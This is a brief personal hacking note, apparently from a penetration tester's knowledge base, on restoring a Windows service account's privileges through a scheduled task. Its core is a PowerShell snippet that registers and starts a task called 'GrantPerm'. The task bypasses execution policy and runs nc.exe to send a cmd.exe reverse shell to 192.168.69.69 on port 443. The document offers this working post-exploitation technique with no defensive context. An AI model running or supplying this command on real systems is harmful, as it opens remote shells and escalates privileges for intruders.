# service account privileges restore using scheduled task with powershell
```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\windows\tasks\nc.exe 192.168.69.69 443 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
```

# References
- [20221003151080](/zet/20221003151080/README.md) service account privileges restore
- [20221003151078](/zet/20221003151078/README.md) service account privileges restore using scheduled task with powershell require seimpersonate privilege for task using principal
- ~/kb/hacking/windows/service-account-privileges.md

Tags:
    #assorted
